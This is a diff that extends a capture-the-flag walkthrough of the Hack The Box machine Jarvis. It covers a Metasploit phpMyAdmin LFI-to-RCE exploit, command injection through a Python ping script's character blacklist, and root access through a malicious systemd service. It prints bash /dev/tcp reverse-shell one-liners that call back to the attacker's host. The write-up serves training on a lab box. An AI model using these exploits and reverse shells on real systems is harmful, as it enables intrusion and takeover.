@@ -177,15 +177,367 @@ We're in! We can see the version of phpmyadmin, 4.8.0.
 
 ![13](Screenshots/J_13.jpg)
 
-Let's look for publicly disclosed vulnerabilities.
+Let's look for publicly disclosed vulnerabilities. This is vulnerable to CVE-2018-12613, a LFI vulnerability that can be changed to achieve RCE.
 
+I haven't used Metasploit in forever, so let's try that. There is a module designed for this vulnerability.
 
+```
+4  exploit/multi/http/phpmyadmin_lfi_rce                 2018-06-19       good       Yes    phpMyAdmin Authenticated Remote Code Execution
+```
 
+Let's select it and set our options.
 
+```
+[msf](Jobs:0 Agents:0) >> use 4
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set USERNAME DBadmin
+USERNAME => DBadmin
+[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set PASSWORD imissyou
+PASSWORD => imissyou
+[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set RHOSTS http://supersecurehotel.htb
+RHOSTS => http://supersecurehotel.htb
+[msf](Jobs:0 Agents:0) exploit(multi/http/phpmyadmin_lfi_rce) >> set LHOST 10.10.15.194
+LHOST => 10.10.15.194
+```
 
+We get a shell as ```www-data```.
 
+```
+[msf](Jobs:0 Agents:1) exploit(multi/http/phpmyadmin_lfi_rce) >> exploit
+[*] Started reverse TCP handler on 10.10.15.194:4444 
+[*] Sending stage (42137 bytes) to 10.129.229.137
+[*] Meterpreter session 2 opened (10.10.15.194:4444 -> 10.129.229.137:33122) at 2026-09-30 14:40:35 -0400
+[-] 10.129.229.137:80 - Failed to drop database myxbh. Might drop when your session closes.
+
+(Meterpreter 2)(/usr/share/phpmyadmin) > shell
+Process 1885 created.
+Channel 0 created.
+whoami
+www-data
+```
+
+We can run a python script as the ```pepper``` user.
+
+```
+sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+```
+
+Let's look at it. It seems to be a simple script that we can list and ping IPs.
+
+```
+#!/usr/bin/env python3
+from datetime import datetime
+import sys
+import os
+from os import listdir
+import re
+
+def show_help():
+    message='''
+********************************************************
+* Simpler   -   A simple simplifier ;)                 *
+* Version 1.0                                          *
+********************************************************
+Usage:  python3 simpler.py [options]
+
+Options:
+    -h/--help   : This help
+    -s          : Statistics
+    -l          : List the attackers IP
+    -p          : ping an attacker IP
+    '''
+    print(message)
+
+def show_header():
+    print('''***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+''')
+
+def show_statistics():
+    path = '/home/pepper/Web/Logs/'
+    print('Statistics\n-----------')
+    listed_files = listdir(path)
+    count = len(listed_files)
+    print('Number of Attackers: ' + str(count))
+    level_1 = 0
+    dat = datetime(1, 1, 1)
+    ip_list = []
+    reks = []
+    ip = ''
+    req = ''
+    rek = ''
+    for i in listed_files:
+        f = open(path + i, 'r')
+        lines = f.readlines()
+        level2, rek = get_max_level(lines)
+        fecha, requ = date_to_num(lines)
+        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if fecha > dat:
+            dat = fecha
+            req = requ
+            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
+        if int(level2) > int(level_1):
+            level_1 = level2
+            ip_list = [ip]
+            reks=[rek]
+        elif int(level2) == int(level_1):
+            ip_list.append(ip)
+            reks.append(rek)
+        f.close()
+	
+    print('Most Risky:')
+    if len(ip_list) > 1:
+        print('More than 1 ip found')
+    cont = 0
+    for i in ip_list:
+        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
+        cont = cont + 1
+	
+    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)
+	
+def list_ip():
+    print('Attackers\n-----------')
+    path = '/home/pepper/Web/Logs/'
+    listed_files = listdir(path)
+    for i in listed_files:
+        f = open(path + i,'r')
+        lines = f.readlines()
+        level,req = get_max_level(lines)
+        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
+        f.close()
+
+def date_to_num(lines):
+    dat = datetime(1,1,1)
+    ip = ''
+    req=''
+    for i in lines:
+        if 'Level' in i:
+            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
+            regex = '(\d+)-(.*)-(\d+)(.*)'
+            logEx=re.match(regex, fecha).groups()
+            mes = to_dict(logEx[1])
+            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
+            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
+            if fecha > dat:
+                dat = fecha
+                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
+    return dat, req
+			
+def to_dict(name):
+    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
+    return month_dict[name]
+	
+def get_max_level(lines):
+    level=0
+    for j in lines:
+        if 'Level' in j:
+            if int(j.split(' ')[4]) > int(level):
+                level = j.split(' ')[4]
+                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
+    return level, req
+	
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+
+if __name__ == '__main__':
+    show_header()
+    if len(sys.argv) != 2:
+        show_help()
+        exit()
+    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
+        show_help()
+        exit()
+    elif sys.argv[1] == '-s':
+        show_statistics()
+        exit()
+    elif sys.argv[1] == '-l':
+        list_ip()
+        exit()
+    elif sys.argv[1] == '-p':
+        exec_ping()
+        exit()
+    else:
+        show_help()
+        exit()
+```
+
+The ping option looks interesting. When the script is called with ```-p```, the ```exec_ping()``` function runs.
+
+The command that we specify is used to make a system call. There seems to be a command injection flaw, but the function deliberately checks through common characters. One that the blacklist forgets is subshell execution with ```$()```. We want to inject a reverse shell oneliner, but with the forbidden characters we can't directly write it out on the command, but we can just write it in a file.
+
+```
+def exec_ping():
+    forbidden = ['&', ';', '-', '`', '||', '|']
+    command = input('Enter an IP: ')
+    for i in forbidden:
+        if i in command:
+            print('Got you')
+            exit()
+    os.system('ping ' + command)
+```
+
+Let's try it. First, we create a file containing the code that we want to run.
+
+```
+cd /tmp
+pwd
+/tmp
+echo -n "bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'" > hi
+cat hi
+bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'
+```
+
+Then, we can run the python script as ```pepper```, specifying the ping option. After supplying our file inside ```$()```, we catch a shell as ```pepper```.
+
+```
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+***********************************************
+     _                 _                       
+ ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
+/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
+\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
+|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
+                |_|               |_|    |___/ 
+                                @ironhackers.es
+                                
+***********************************************
+
+Enter an IP: $(/tmp/hi)
+```
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-8j15agp1rz]─[~]
+└──╼ [★]$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.229.137 33138
+bash: cannot set terminal process group (572): Inappropriate ioctl for device
+bash: no job control in this shell
+pepper@jarvis:/tmp$ whoami
+whoami
+pepper
+```
+
+We can proceed to get the user flag from here.
 
 ## Root Flag
+
+There is an unusual directory inside ```home/pepper```.
+
+```
+pepper@jarvis:~$ ls
+Web  user.txt
+```
+
+Inside of it, there seems to be logs of our fuzzing attempt way earlier. This is probably because there was a firewall, which explains port 64999 with the weird message telling us that we were blocked for 90 seconds. However, this isn't really a clear vector.
+
+```
+pepper@jarvis:~/Web$ ls -la
+total 12
+drwxr-xr-x 3 pepper pepper 4096 May  9  2022 .
+drwxr-xr-x 4 pepper pepper 4096 May  9  2022 ..
+drwxr-xr-x 2 pepper pepper 4096 Sep 30 11:14 Logs
+pepper@jarvis:~/Web$ cd Logs
+pepper@jarvis:~/Web/Logs$ ls -la
+total 16
+drwxr-xr-x 2 pepper pepper 4096 Sep 30 11:14 .
+drwxr-xr-x 3 pepper pepper 4096 May  9  2022 ..
+-rw-r--r-- 1 root   root   8131 Sep 30 11:14 10.10.15.194.txt
+pepper@jarvis:~/Web/Logs$ cat 10.10.15.194.txt
+10.10.15.194
+-------------
+Attack 1 : Level 2 : 2026-Sep-30 11:14:08 : GET /order HTTP/1.1
+
+Attack 2 : Level 2 : 2026-Sep-30 11:14:09 : GET /orders HTTP/1.1
+
+Attack 3 : Level 1 : 2026-Sep-30 11:14:10 : GET /\' HTTP/1.1
+
+Attack 4 : Level 2 : 2026-Sep-30 11:14:10 : GET /camcorders HTTP/1.1
+
+Attack 5 : Level 2 : 2026-Sep-30 11:14:11 : GET /ordering HTTP/1.1
+
+Attack 6 : Level 2 : 2026-Sep-30 11:14:12 : GET /border HTTP/1.1
+```
+
+Looking at SUID bit binaries, ```systemctl``` seems interesting.
+
+```
+pepper@jarvis:~$ find / -perm -4000 -type f 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/systemctl
+/bin/umount
+/bin/su
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+On GTFOBins, it tells us that we can create and run a malicious systemd service.
+
+Let's try it.
+
+First, we create a malicious service file that contains a command to initiate a connection back to us.
+
+```
+pepper@jarvis:/dev/shm$ cat hi.service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.194/4445 0>&1"
+[Install]
+WantedBy=multi-user.target
+```
+
+Then, we issue these two commands to start our service.
+
+```
+pepper@jarvis:~$ systemctl link /dev/shm/hi.service
+Created symlink /etc/systemd/system/hi.service -> /dev/shm/hi.service.
+pepper@jarvis:/dev/shm$ systemctl start /dev/shm/hi.service
+```
+
+We get a connection back as ```root```.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-8j15agp1rz]─[~]
+└──╼ [★]$ nc -lvnp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.129.229.137 46870
+bash: cannot set terminal process group (25251): Inappropriate ioctl for device
+bash: no job control in this shell
+root@jarvis:/# whoami
+whoami
+root
+```
+
+We can proceed to get the root flag from here.
+
+Nice pwn!
 
 ## Contact
 
